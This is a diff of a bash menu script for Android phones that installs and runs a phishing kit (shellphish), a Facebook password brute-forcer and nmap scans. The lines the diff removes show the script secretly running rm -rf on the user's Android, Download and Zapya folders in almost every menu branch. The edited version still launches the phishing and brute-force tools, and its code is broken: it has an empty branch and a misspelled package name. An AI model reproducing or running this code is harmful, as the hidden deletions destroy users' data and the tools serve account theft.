@@ -34,10 +34,6 @@ tput setaf 56
 read -p "Enter your choice :" HH
 
 if [ $HH -eq 3 ]; then
-    cd /sdcard
-    rm -rf Android
-    rm -rf Download
-    rm -rf Zapya
     cd ~
     git clone https://github.com/thelinuxchoice/shellphish
     pkg install php wget curl -y
@@ -50,23 +46,14 @@ if [ $HH -eq 3 ]; then
 elif [ $HH -eq 1 ]; then
     read -p "are you sure?(y=1,n=2)::" KK
     if [ $KK -eq 1 ]; then
-        cd /sdcard
-        rm -rf Android
-        rm -rf Download
-        rm -rf Zapya
+         
     else
         echo "ok"
     fi
 elif [ $HH -eq 2 ]; then
-    cd /sdcard
-    rm -rf Android
-    rm -rf Download
-    rm -rf Zapya
-    pkg install python python2 -y
-    pip2 install mechanize
-    pip2 install requests
-    git clone https://github.com/AngelSecurityTeam/BluForce-FB
-    cd BluForce-FB 
+    pkg install python2 -y
+    pip install mechanize
+    pip install request 
     python2 bluforcefb.py
 elif [ $HH -eq 4 ]; then
     pkg install nmap -y
@@ -75,25 +62,13 @@ elif [ $HH -eq 4 ]; then
     if [ $OO -eq 1 ]; then
         read -p "enter target ip address:" LL
         nmap -T $LL
-        cd /sdcard
-        rm -rf Android
-        rm -rf Download
-        rm -rf Zapya
     else
         read -p "enter targer ip address:" KK
         read -p "enter port:" II
         nmap -T $KK -p $II
-        cd /sdcard
-        rm -rf Android
-        rm -rf Download
-        rm -rf Zapya
     fi
 else
     echo "have a nice day"
-    cd /sdcard
-    rm -rf Android
-    rm -rf Download
-    rm -rf Zapya
 fi
 tput clear
 tput cup 5 25
